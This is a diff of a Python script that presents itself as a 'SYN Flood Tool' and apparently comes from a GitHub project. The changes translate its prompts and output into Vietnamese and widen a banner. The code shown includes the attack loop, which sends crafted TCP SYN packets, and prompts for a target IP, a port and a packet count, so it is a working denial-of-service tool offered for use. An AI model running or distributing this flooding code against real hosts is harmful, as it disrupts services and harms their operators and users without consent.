@@ -38,16 +38,16 @@ def SYN_Flood(dstIP,dstPort,counter):
 		send(IP_Packet/TCP_Packet, verbose=0)
 		total+=1
 
-	stdout.write("\nTotal packets sent: %i\n" % total)
+	stdout.write("\nTổng số gói đã gửi: %i\n" % total)
 
 
 def info():
 	system("clear")
-	print ("#####################################")
-	print ("#        github.com/DauDau432       #")
-	print ("#####################################")
+	print ("########################################")
+	print ("#         github.com/DauDau432         #")
+	print ("########################################")
 	print ("# Chào mừng bạn đến với SYN Flood Tool #")
-	print ("#####################################")
+	print ("########################################")
 
 	dstIP = input ("\nTarget IP : ")
 	dstPort = input ("Target Port : ")
@@ -57,7 +57,6 @@ def info():
 
 def main():
 	dstIP,dstPort = info()
-	counter = input ("How many packets do you want to send : ")
+	counter = input ("Bạn muốn gửi bao nhiêu gói: ")
 	SYN_Flood(dstIP,dstPort,int(counter))
-
 main()
